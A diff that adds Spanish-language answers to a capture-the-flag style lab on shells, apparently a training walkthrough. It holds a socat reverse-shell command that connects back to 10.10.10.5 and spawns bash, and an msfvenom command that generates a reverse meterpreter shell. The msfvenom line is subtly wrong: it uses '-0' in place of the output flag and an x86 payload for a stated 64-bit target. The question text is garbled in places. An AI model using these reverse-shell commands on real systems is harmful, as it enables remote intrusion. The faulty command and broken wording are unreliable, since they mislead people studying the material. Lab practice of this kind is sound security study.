@@ -48,4 +48,20 @@ Si su IP es 10.10.10.5, ¿qué sintaxis usaría para conectarse de nuevo a este 
 
     socat TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
+## Common Shell Payloads  
+
+¿Qué comando se puede usar para crear una tubería con nombre en Linux?
+
+    mkfifo
+
+## Msfvenom
+
+¿Qué símbolo se usa para mostrar que un caparazón no tiene escenario?
+ 
+    _
+
+¿Qué comando usaría para generar un shell inverso meterpreter por etapas para un destino Linux de 64 bits , asumiendo que su propia IP era 10.10.10.5 y estaba escuchando en el puerto 443? El formato del shell eself y el nombre del archivo de salida debe sershell
+
+    msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -0 shell LHOST=10.10.10.5 LPORT=443
+
 
